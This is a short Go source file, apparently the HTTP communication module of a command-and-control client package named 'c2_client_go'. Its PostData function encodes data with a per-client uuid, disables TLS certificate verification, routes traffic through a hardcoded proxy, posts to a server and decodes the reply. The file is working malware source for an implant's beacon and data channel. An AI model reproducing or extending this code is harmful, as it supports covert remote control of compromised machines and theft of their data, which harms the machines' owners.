package http

import (
	"c2_client_go/config"
	"c2_client_go/encode"
	"crypto/tls"
	"fmt"
	"github.com/go-resty/resty/v2"
	"log"
	"time"
)

func PostData(url string, poststr string,uuid string) (string, int) {
	fmt.Println(poststr)
	client := resty.New().SetTimeout(3 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}) //忽略https证书错误，设置超时时间
	client.SetProxy("http://127.0.0.1:8080")
	client.Header.Set("User-Agent",config.UserAgent)
	client.Header.Add("uuid",uuid)
	encodestr:=encode.Encodestr(poststr,uuid)
	resp, err := client.R().SetBody(encodestr).EnableTrace().Post(url)
	if err != nil {
		log.Println(err)
	}
	str := resp.Body()
	body := string(str)
	s:=encode.Decodestr(body,uuid)
	code := resp.StatusCode()
	//fmt.Println(code)
	return s, code
}
